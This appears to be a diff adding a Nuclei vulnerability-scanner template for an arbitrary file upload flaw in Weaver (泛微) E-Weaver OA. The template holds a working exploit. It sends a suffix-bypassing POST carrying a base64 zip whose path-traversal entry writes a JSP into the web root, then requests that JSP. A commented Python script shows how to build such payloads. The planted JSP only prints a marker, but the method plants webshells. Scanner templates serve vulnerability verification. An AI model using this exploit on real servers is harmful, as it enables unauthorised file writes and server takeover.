@@ -1,0 +1,54 @@
+id: fanwei-eweaver-common-ctrl-fileupload
+
+info:
+  name: 泛微OA E-Weaver weaver.common.Ctrl 任意文件上传漏洞
+  author: Evilc0de  
+  severity: critical 
+  description: 泛微OA weaver.common.Ctrl 存在任意文件上传漏洞，攻击者通过漏洞可以上传webshell文件控制服务器
+  reference: 
+    - https://xz.aliyun.com/t/9581
+  tags: fanwei,oa,eweaver,fileupload
+
+# cur、ico、css、png、jpg、gif 关键字后缀均可绕过
+http:
+  - raw:
+      - |
+        POST /weaver/weaver.common.Ctrl/.css?arg0=com.cloudstore.api.service.Service_CheckApp&arg1=validateApp HTTP/1.1
+        Host: {{Hostname}} 
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary92pUawKc
+
+        ------WebKitFormBoundary92pUawKc
+        Content-Disposition: form-data; name="myFile";filename="{{randstr}}.zip"
+        
+        {{base64_decode("UEsDBBQAAAAIAASPPFZnkUfHXwAAAGgAAAAtAAAALi4vLi4vLi4vNzU1Zjg1YzI3MjNiYjM5MzgxYzczNzlhNjA0MTYwZDguanNwNcZZCoAgFADAq4QgVISUZhpZdBVtw7CUeEbHD4LmaxQeg96WxB7BX9CjXd+awPIAyYvvEaz7bz3JER4U9hFIuOwJ7kyR4HyVfKKCMmNYy2Q1CSZa3ZR11ZSzRFmHhxdQSwECFAAUAAAACAAEjzxWZ5FHx18AAABoAAAALQAAAAAAAAAAAAAAgAEAAAAALi4vLi4vLi4vNzU1Zjg1YzI3MjNiYjM5MzgxYzczNzlhNjA0MTYwZDguanNwUEsFBgAAAAABAAEAWwAAAKoAAAAAAA==")}}
+        ------WebKitFormBoundary92pUawKc--
+
+      - |
+        GET /cloudstore/755f85c2723bb39381c7379a604160d8.jsp HTTP/1.1
+        Host: {{Hostname}}
+
+    req-condition: true # dsl跨请求处理需要开启选项
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code_2 == 200'
+          - 'contains(body_2, "755f85c2723bb39381c7379a604160d8")'
+        condition: and
+
+
+# python3生成shell+zip+base64字符串脚本
+# #!/usr/bin/env python3
+# # coding=utf-8
+# import zipfile
+# import base64
+# shell = """<%@page import="java.text.*,java.util.*,java.io.*"%><%out.println("755f85c2723bb39381c7379a604160d8");%>"""
+# webshell_name = '755f85c2723bb39381c7379a604160d8.jsp'  # md5('good')
+# zip_webshell_path = '../../../' + webshell_name
+# _zipfile = "temp1.zip"
+# zf = zipfile.ZipFile(_zipfile, mode='w', compression=zipfile.ZIP_DEFLATED)
+# zf.writestr(zip_webshell_path, shell)
+# zf.close()
+# with open(_zipfile, 'rb') as zf:
+#     _zipb64data = base64.b64encode(zf.read())
+#     print(_zipb64data)
+# # b'UEsDBBQAAAAIAASPPFZnkUfHXwAAAGgAAAAtAAAALi4vLi4vLi4vNzU1Zjg1YzI3MjNiYjM5MzgxYzczNzlhNjA0MTYwZDguanNwNcZZCoAgFADAq4QgVISUZhpZdBVtw7CUeEbHD4LmaxQeg96WxB7BX9CjXd+awPIAyYvvEaz7bz3JER4U9hFIuOwJ7kyR4HyVfKKCMmNYy2Q1CSZa3ZR11ZSzRFmHhxdQSwECFAAUAAAACAAEjzxWZ5FHx18AAABoAAAALQAAAAAAAAAAAAAAgAEAAAAALi4vLi4vLi4vNzU1Zjg1YzI3MjNiYjM5MzgxYzczNzlhNjA0MTYwZDguanNwUEsFBgAAAAABAAEAWwAAAKoAAAAAAA=='
